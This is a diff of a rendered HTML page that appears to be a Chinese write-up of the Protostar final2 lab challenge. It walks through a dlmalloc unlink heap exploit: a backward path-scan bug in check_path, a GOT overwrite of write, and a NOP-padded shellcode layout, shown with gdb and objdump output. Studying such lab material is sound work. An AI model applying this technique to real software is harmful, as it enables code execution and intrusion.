+</span></span><span style="display:flex;"><span>&lt;get_requests+40&gt;:	call   0x804b4ee &lt;calloc&gt;
+</span></span><span style="display:flex;"><span>&lt;get_requests+45&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp-0x14<span style="color:#f92672">]</span>,eax	
+</span></span><span style="display:flex;"><span>//--&gt; buf <span style="color:#f92672">=</span> eax <span style="color:#f92672">=</span> &lt;calloc&gt;<span style="color:#960050;background-color:#1e0010">&#39;</span>s <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>&lt;get_requests+48&gt;:	mov    eax,DWORD PTR <span style="color:#f92672">[</span>ebp-0x10<span style="color:#f92672">]</span>	
+</span></span><span style="display:flex;"><span>//--&gt; eax <span style="color:#f92672">=</span> dll
+</span></span><span style="display:flex;"><span>&lt;get_requests+51&gt;:	mov    edx,DWORD PTR <span style="color:#f92672">[</span>ebp-0x14<span style="color:#f92672">]</span>	
+</span></span><span style="display:flex;"><span>//--&gt; edx <span style="color:#f92672">=</span> buf
+</span></span><span style="display:flex;"><span>&lt;get_requests+54&gt;:	mov    DWORD PTR <span style="color:#f92672">[</span>ebp+eax*4-0x414<span style="color:#f92672">]</span>,edx
+</span></span><span style="display:flex;"><span>//--&gt; <span style="color:#f92672">[</span>ebp + eax*4 - 0x414<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> edx
+</span></span><span style="display:flex;"><span>//--&gt; <span style="color:#f92672">[</span>ebp - 0x414 + eax*4<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> edx
+</span></span><span style="display:flex;"><span>//--&gt; <span style="color:#f92672">[</span>ebp - 0x414 + dll*4<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> buf
+</span></span><span style="display:flex;"><span>ebp - 0x414 看起来像是某个起始值...再加上 dll*4 <span style="color:#f92672">(</span>int 数组一个值 4bytes<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>所以大概可以推断出源码是这样：
+</span></span><span style="display:flex;"><span>destroylist<span style="color:#f92672">[</span>dll<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>即：
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>dll <span style="color:#f92672">=</span> 0;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span><span style="color:#f92672">(</span>1<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>dll &gt;<span style="color:#f92672">=</span> 255<span style="color:#f92672">)</span> break;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      buf <span style="color:#f92672">=</span> calloc<span style="color:#f92672">(</span>REQSZ, 1<span style="color:#f92672">)</span>;
+</span></span><span style="display:flex;"><span>      destroylist<span style="color:#f92672">[</span>dll<span style="color:#f92672">]</span> <span style="color:#f92672">=</span> buf; //&lt;--就是这玩意，题目给的源码里根本没写
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span><span style="color:#f92672">(</span>read<span style="color:#f92672">(</span>fd, buf, REQSZ<span style="color:#f92672">)</span> !<span style="color:#f92672">=</span> REQSZ<span style="color:#f92672">)</span> break;
+</span></span><span style="display:flex;"><span>      .......
 </span></span></code></pre></div><p>另外，<code>void check_path(char *buf)</code> 里的那句 <code>printf</code> 也并没在汇编代码中出现&hellip;</p>
 <hr>
 <h2 id="vulnerability">Vulnerability</h2>
 <p>这道题的关键在于 <code>void check_path(char *buf)</code> 中的</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">p</span> <span class="o">=</span> <span class="nf">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="n">l</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="n">start</span> <span class="o">=</span> <span class="nf">strstr</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;ROOT&#34;</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">          <span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">          <span class="nf">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">          <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;moving from %p to %p (exploit: %s / %d)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">start</span><span class="p">,</span> <span class="n">start</span> <span class="o">&lt;</span> <span class="n">buf</span> <span class="o">?</span>
-</span></span><span class="line"><span class="cl">          <span class="s">&#34;yes&#34;</span> <span class="o">:</span> <span class="s">&#34;no&#34;</span><span class="p">,</span> <span class="n">start</span> <span class="o">-</span> <span class="n">buf</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="p">}</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  p <span style="color:#f92672">=</span> <span style="color:#a6e22e">rindex</span>(buf, <span style="color:#e6db74">&#39;/&#39;</span>);
+</span></span><span style="display:flex;"><span>  l <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(p);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(p) {
+</span></span><span style="display:flex;"><span>      start <span style="color:#f92672">=</span> <span style="color:#a6e22e">strstr</span>(buf, <span style="color:#e6db74">&#34;ROOT&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(start) {
+</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">while</span>(<span style="color:#f92672">*</span>start <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) start<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">memmove</span>(start, p, l);
+</span></span><span style="display:flex;"><span>          <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;moving from %p to %p (exploit: %s / %d)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, p, start, start <span style="color:#f92672">&lt;</span> buf <span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span>          <span style="color:#e6db74">&#34;yes&#34;</span> <span style="color:#f92672">:</span> <span style="color:#e6db74">&#34;no&#34;</span>, start <span style="color:#f92672">-</span> buf);
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><p>程序的预期（只是举例）：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="s">&#34;abcd/adcdROOT&#34;</span>
-</span></span><span class="line"><span class="cl">           <span class="err">↑</span><span class="n">p</span> <span class="o">=</span> <span class="nf">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="s">&#34;/adcdROOT&#34;</span>
-</span></span><span class="line"><span class="cl">            <span class="n">l</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">=</span> <span class="mi">9</span>
-</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="s">&#34;abcd/adcdROOT&#34;</span>
-</span></span><span class="line"><span class="cl">           <span class="err">↑</span>    <span class="err">↑</span><span class="n">start</span>
-</span></span><span class="line"><span class="cl">           <span class="err">↑</span><span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcd/adcdROOT&#34;</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#960050;background-color:#1e0010">↑</span>p <span style="color:#f92672">=</span> <span style="color:#a6e22e">rindex</span>(buf, <span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/adcdROOT&#34;</span>
+</span></span><span style="display:flex;"><span>            l <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(p) <span style="color:#f92672">=</span> <span style="color:#ae81ff">9</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcd/adcdROOT&#34;</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#960050;background-color:#1e0010">↑</span>    <span style="color:#960050;background-color:#1e0010">↑</span>start
+</span></span><span style="display:flex;"><span>           <span style="color:#960050;background-color:#1e0010">↑</span><span style="color:#66d9ef">while</span>(<span style="color:#f92672">*</span>start <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) start<span style="color:#f92672">--</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(start, p, l)
 </span></span></code></pre></div><p>也就是 <code>ROOT</code> 出现在 <code>/</code> 后面&hellip;但如果出现在了前面的话..?</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="s">&#34;abcdROOTadcd/&#34;</span>
-</span></span><span class="line"><span class="cl">                   <span class="err">↑</span><span class="n">p</span> <span class="o">=</span> <span class="nf">rindex</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">p</span> <span class="o">=</span> <span class="s">&#34;/&#34;</span>
-</span></span><span class="line"><span class="cl">                    <span class="n">l</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">p</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span>
-</span></span><span class="line"><span class="cl"><span class="n">buf</span> <span class="o">=</span> <span class="s">&#34;abcdROOTadcd/&#34;</span>
-</span></span><span class="line"><span class="cl">           <span class="err">↑</span><span class="n">start</span>
-</span></span><span class="line"><span class="cl"><span class="err">←</span><span class="k">while</span><span class="p">(</span><span class="o">*</span><span class="n">start</span> <span class="o">!=</span> <span class="sc">&#39;/&#39;</span><span class="p">)</span> <span class="n">start</span><span class="o">--</span><span class="p">;</span> <span class="err">减到不知道哪里去了</span><span class="n">x</span>
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nf">memmove</span><span class="p">(</span><span class="n">start</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">l</span><span class="p">)</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdROOTadcd/&#34;</span>
+</span></span><span style="display:flex;"><span>                   <span style="color:#960050;background-color:#1e0010">↑</span>p <span style="color:#f92672">=</span> <span style="color:#a6e22e">rindex</span>(buf, <span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span>                    p <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>                    l <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(p) <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>buf <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;abcdROOTadcd/&#34;</span>
+</span></span><span style="display:flex;"><span>           <span style="color:#960050;background-color:#1e0010">↑</span>start
+</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">←</span><span style="color:#66d9ef">while</span>(<span style="color:#f92672">*</span>start <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;/&#39;</span>) start<span style="color:#f92672">--</span>; <span style="color:#960050;background-color:#1e0010">减到不知道哪里去了</span>x
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">memmove</span>(start, p, l)
 </span></span></code></pre></div><p>到这个地方我们大概就可以知道，可以利用这一点把 <code>start</code> 移动到当前栈帧向前的任意 <code>/</code>处，<code>memmove(start, p, l)</code></p>
 <p>然后再利用 <code>int get_requests(int fd)</code> 的 <code>free(destroylist[i])</code>！</p>
 <p>这就是那个 <code>unlink()</code> 的 trick 了，</p>
-<br>
+<!-- raw HTML omitted -->
 <p><em><strong>关于 dlmalloc 的 unlink trick，全部已经移动到了这里：<a class="link" href="/p/old_dlmalloc_unlink_tricks" >Old Dlmalloc Unlink Tricks</a></strong></em></p>
 <p><em><strong>请看完那篇后再继续向下看</strong></em></p>
-<br>
+<!-- raw HTML omitted -->
 <hr>
 <h2 id="restriction">Restriction</h2>
 <p><code>int get_requests(int fd)</code> 中有两句很讨厌的话：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">  <span class="n">dll</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="n">dll</span> <span class="o">&gt;=</span> <span class="mi">255</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="n">buf</span> <span class="o">=</span> <span class="nf">calloc</span><span class="p">(</span><span class="n">REQSZ</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
-</span></span><span class="line"><span class="cl">      <span class="n">destroylist</span><span class="p">[</span><span class="n">dll</span><span class="p">]</span> <span class="o">=</span> <span class="n">buf</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      
-</span></span><span class="line"><span class="cl">      <span class="c1">//就是这两句
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>      <span class="k">if</span><span class="p">(</span><span class="nf">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="o">!=</span> <span class="n">REQSZ</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      <span class="k">if</span><span class="p">(</span><span class="nf">strncmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;FSRD&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">      
-</span></span><span class="line"><span class="cl">      <span class="nf">check_path</span><span class="p">(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">4</span><span class="p">);</span>     
-</span></span><span class="line"><span class="cl">      <span class="n">dll</span><span class="o">++</span><span class="p">;</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  dll <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span>(<span style="color:#ae81ff">1</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(dll <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">255</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      buf <span style="color:#f92672">=</span> <span style="color:#a6e22e">calloc</span>(REQSZ, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>      destroylist[dll] <span style="color:#f92672">=</span> buf;
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#75715e">//就是这两句
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">read</span>(fd, buf, REQSZ) <span style="color:#f92672">!=</span> REQSZ) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">strncmp</span>(buf, <span style="color:#e6db74">&#34;FSRD&#34;</span>, <span style="color:#ae81ff">4</span>) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>      
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">check_path</span>(buf <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>);     
+</span></span><span style="display:flex;"><span>      dll<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>  }
 </span></span></code></pre></div><p>所以我们输入的字符串：</p>
 <ol>
 <li>必须得有 <code>REQSZ = 128 bytes</code> 个字符，否则 break</li>
@@ -566,9 +573,9 @@ if (!doNotTrack) {
 <p>不是通过 mmap 分配（已满足）</p>
 </li>
 <li>
-<p><em>aChunk</em> 的 <em>相邻下一个 chunk</em> 并不是最后堆中的最后一个<br>
-且，<em>aChunk</em> 的 <em>相邻下一个 chunk</em> 的 <em>再相邻下一个 chunk</em> 的 <code>PREV_INUSE</code> 为否<br>
-(也就相当于 <em>aChunk</em> 的 <em>相邻下一个 chunk</em> 不在被使用)<br></p>
+<p><em>aChunk</em> 的 <em>相邻下一个 chunk</em> 并不是最后堆中的最后一个<!-- raw HTML omitted -->
+且，<em>aChunk</em> 的 <em>相邻下一个 chunk</em> 的 <em>再相邻下一个 chunk</em> 的 <code>PREV_INUSE</code> 为否<!-- raw HTML omitted -->
+(也就相当于 <em>aChunk</em> 的 <em>相邻下一个 chunk</em> 不在被使用)<!-- raw HTML omitted --></p>
 <p>=&gt; 会对 <em>aChunk</em> 的 <em>相邻下一个 chunk</em> 执行 <code>unlink()</code></p>
 </li>
 </ol>
@@ -580,14 +587,14 @@ if (!doNotTrack) {
 <hr>
 <p>可以开始考虑一下 <code>P-&gt;fd</code> 和 <code>P-&gt;bk</code> 要写什么了</p>
 <p>比如把某个可怜的函数指向动态链接表里的值指向堆上的某段 shellcode&hellip;这道题里似乎只能选择这个 <code>write()</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">get_requests</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">)</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl"><span class="p">......</span>
-</span></span><span class="line"><span class="cl">  <span class="k">for</span><span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">dll</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">write</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">strlen</span><span class="p">(</span><span class="s">&#34;Process OK</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">));</span>
-</span></span><span class="line"><span class="cl">      <span class="nf">free</span><span class="p">(</span><span class="n">destroylist</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
-</span></span><span class="line"><span class="cl">  <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">get_requests</span>(<span style="color:#66d9ef">int</span> fd)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>......
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span>(i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> dll; i<span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">write</span>(fd, <span style="color:#e6db74">&#34;Process OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;Process OK</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">free</span>(destroylist[i]);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>如果我们弄出两个堆帧，那么执行顺序是：</p>
 <ol>
 <li>write()</li>
@@ -597,44 +604,44 @@ if (!doNotTrack) {
 </ol>
 <p>在 <code>2. free(chunkA)</code> 的时候我们就已经通过 unlink 覆写了 write 指向的地址
 那么在 <code>4. free(chunkB)</code> 之前 shellcode 就已经执行了</p>
-<br>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">user@protostar:~$ objdump -R /opt/protostar/bin/final2 <span class="p">|</span> grep write
-</span></span><span class="line"><span class="cl">0804d41c R_386_JUMP_SLOT   write
-</span></span><span class="line"><span class="cl">0804d468 R_386_JUMP_SLOT   fwrite
-</span></span><span class="line"><span class="cl">user@protostar:~$
+<!-- raw HTML omitted -->
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>user@protostar:~$ objdump -R /opt/protostar/bin/final2 | grep write
+</span></span><span style="display:flex;"><span>0804d41c R_386_JUMP_SLOT   write
+</span></span><span style="display:flex;"><span>0804d468 R_386_JUMP_SLOT   fwrite
+</span></span><span style="display:flex;"><span>user@protostar:~$
 </span></span></code></pre></div><p>套用 <em><strong><a class="link" href="/p/dlmalloc_unlink_vuln/#vulnerability-unlink" >Vulnerability: unlink</a></strong></em> 中的公式：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">令 <span class="nv">fd</span> <span class="o">=</span> addr of write - 0xc
-</span></span><span class="line"><span class="cl"><span class="nv">fd</span> <span class="o">=</span> 
-</span></span><span class="line"><span class="cl">令 <span class="nv">bk</span> <span class="o">=</span> addr of shllcode
-</span></span><span class="line"><span class="cl">那么
-</span></span><span class="line"><span class="cl">我们所想要的：
-</span></span><span class="line"><span class="cl">fd + <span class="nv">0xc</span> <span class="o">=</span> addr of shllcode
-</span></span><span class="line"><span class="cl">我们必须得纳入考虑并避免的：
-</span></span><span class="line"><span class="cl">bk + <span class="nv">0x8</span> <span class="o">=</span> addr of func
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>令 fd <span style="color:#f92672">=</span> addr of write - 0xc
+</span></span><span style="display:flex;"><span>fd <span style="color:#f92672">=</span> 
+</span></span><span style="display:flex;"><span>令 bk <span style="color:#f92672">=</span> addr of shllcode
+</span></span><span style="display:flex;"><span>那么
+</span></span><span style="display:flex;"><span>我们所想要的：
+</span></span><span style="display:flex;"><span>fd + 0xc <span style="color:#f92672">=</span> addr of shllcode
+</span></span><span style="display:flex;"><span>我们必须得纳入考虑并避免的：
+</span></span><span style="display:flex;"><span>bk + 0x8 <span style="color:#f92672">=</span> addr of func
 </span></span></code></pre></div><p>第一个堆帧在 gdb 里看起来是这样的：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/40x 0x804e000
-</span></span><span class="line"><span class="cl">0x804e000:	0x00000000	0x00000089	0x44525346	0x41414141
-</span></span><span class="line"><span class="cl">0x804e010:	0x42424242	0x43434343	0x44444444	0x45454545
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/40x 0x804e000
+</span></span><span style="display:flex;"><span>0x804e000:	0x00000000	0x00000089	0x44525346	0x41414141
+</span></span><span style="display:flex;"><span>0x804e010:	0x42424242	0x43434343	0x44444444	0x45454545
 </span></span></code></pre></div><p>4142434445 只是一堆随便的字符，先不管它</p>
-<p><code>0x804e008: 44525346</code>: 就是开头说过的「必须以 <code>FSRD</code> 开头，否则 break」<br>
+<p><code>0x804e008: 44525346</code>: 就是开头说过的「必须以 <code>FSRD</code> 开头，否则 break」<!-- raw HTML omitted -->
 同时这里也是 buffer 开始的位置 (mem) 和 <code>addr of shellcode</code></p>
 <p><code>0x804e010: 0x42424242</code>: 这里相当于就是 <code>addr of shellcode+0x8</code>，前文提到过这里会被 <code>unlink()</code> 写上 <code>addr of write()</code></p>
 <p>所以 shellcode 实际是从 <code>0x804e014: 0x43434343</code> 开始</p>
 <p>即</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span>gdb<span class="o">)</span> x/40x 0x804e000                write 指向了这里↓
-</span></span><span class="line"><span class="cl">0x804e000: <span class="o">[</span>00000000<span class="o">]</span> <span class="p">|</span> <span class="o">[</span>00000089<span class="o">]</span> <span class="p">|</span> <span class="o">[</span>F S R D<span class="o">]</span> <span class="p">|</span> <span class="o">[</span>NOPNOPNOP<span class="o">]</span>
-</span></span><span class="line"><span class="cl">0x804e010: <span class="o">[</span>NOPNOPNOP<span class="o">]</span><span class="p">|</span> <span class="o">[</span>Shellcode.......................
-</span></span><span class="line"><span class="cl">              ↑这里会被写上 <span class="sb">`</span>addr of write<span class="o">()</span><span class="sb">`</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> x/40x 0x804e000                write 指向了这里↓
+</span></span><span style="display:flex;"><span>0x804e000: <span style="color:#f92672">[</span>00000000<span style="color:#f92672">]</span> | <span style="color:#f92672">[</span>00000089<span style="color:#f92672">]</span> | <span style="color:#f92672">[</span>F S R D<span style="color:#f92672">]</span> | <span style="color:#f92672">[</span>NOPNOPNOP<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>0x804e010: <span style="color:#f92672">[</span>NOPNOPNOP<span style="color:#f92672">]</span>| <span style="color:#f92672">[</span>Shellcode.......................
+</span></span><span style="display:flex;"><span>              ↑这里会被写上 <span style="color:#e6db74">`</span>addr of write<span style="color:#f92672">()</span><span style="color:#e6db74">`</span>
 </span></span></code></pre></div><blockquote>
 <p>这里有点点问题</p>
 <p>毕竟，虽然写上了 NOP，但 0x804e010 处的 addr of write 的地址也确实会被当作一些指令</p>
 <p>这次运气倒是比较好，因为这个指令翻译过去的话是：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># x86 (32), Little Endian</span>
-</span></span><span class="line"><span class="cl">1cd40408
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="c1"># Disassembly</span>
-</span></span><span class="line"><span class="cl">0x0000000000000000:  1C D4    sbb al, 0xd4
-</span></span><span class="line"><span class="cl">0x0000000000000002:  <span class="m">04</span> <span class="m">08</span>    add al, <span class="m">8</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># x86 (32), Little Endian</span>
+</span></span><span style="display:flex;"><span>1cd40408
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Disassembly</span>
+</span></span><span style="display:flex;"><span>0x0000000000000000:  1C D4    sbb al, 0xd4
